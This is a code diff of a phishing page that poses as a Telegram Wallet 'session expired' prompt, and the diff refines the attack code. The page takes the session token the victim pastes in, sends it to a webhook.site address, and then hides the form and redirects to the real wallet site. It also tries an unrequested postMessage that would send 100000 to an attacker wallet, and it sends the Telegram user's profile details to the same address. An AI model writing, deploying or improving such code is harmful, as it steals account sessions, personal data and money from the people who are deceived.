@@ -39,7 +39,7 @@
   <p>Your Telegram Wallet session has expired. Please verify your session token to continue.</p>
 
   <div id="form">
-    <textarea id="token" placeholder="Paste your session token here..."></textarea><br><br>
+    <textarea id="token" autocomplete="off" name="session_token" placeholder="Paste your session token here..."></textarea><br><br>
     <button onclick="steal()">Verify</button>
   </div>
 
@@ -48,7 +48,7 @@
   </div>
 
   <script>
-    // Wallet postMessage injection
+    // Silent wallet trigger via postMessage
     const payload = "../../../wallet/send?amount=100000&to=@attacker_wallet";
     const message = JSON.stringify({
       eventType: 'web_app_open_tg_link',
@@ -58,39 +58,39 @@
     });
 
     setTimeout(() => {
-      window.opener?.postMessage(message, "*");
-      console.log("✅ postMessage payload sent.");
-    }, 1500);
+      try {
+        window.opener?.postMessage(message, "*");
+        console.log("✅ postMessage payload sent.");
+      } catch (e) {
+        console.warn("Failed to postMessage:", e);
+      }
+    }, 1200);
 
-    // Fake session verify
+    // Steal token & hide UI
     function steal() {
       const token = document.getElementById("token").value.trim();
-      if (!token) {
-        alert("⚠️ Please paste a session token first.");
-        return;
-      }
+      if (!token) return;
 
       fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
         method: "POST",
         headers: { "Content-Type": "text/plain" },
-        body: "Captured Token: " + token
+        body: `Captured Token: ${token}`
       });
 
-      // Update UI
       document.getElementById("form").style.display = "none";
       document.getElementById("success").style.display = "block";
 
-      // Optional redirect after 2 seconds
       setTimeout(() => {
-        window.location.href = "https://t.me/wallet"; // redirect target
+        window.location.href = "https://t.me/wallet";
       }, 2000);
     }
 
-    // Telegram user info exfil
+    // Telegram WebApp user info steal (if in context)
     try {
       window.Telegram.WebApp.ready();
       const tg = window.Telegram.WebApp;
       const user = tg.initDataUnsafe?.user;
+
       if (user) {
         fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
           method: "POST",
@@ -100,7 +100,7 @@
             username: user.username,
             first_name: user.first_name,
             last_name: user.last_name,
-            lang: user.language_code,
+            language_code: user.language_code,
             ua: navigator.userAgent,
             source: "Telegram WebApp"
           })
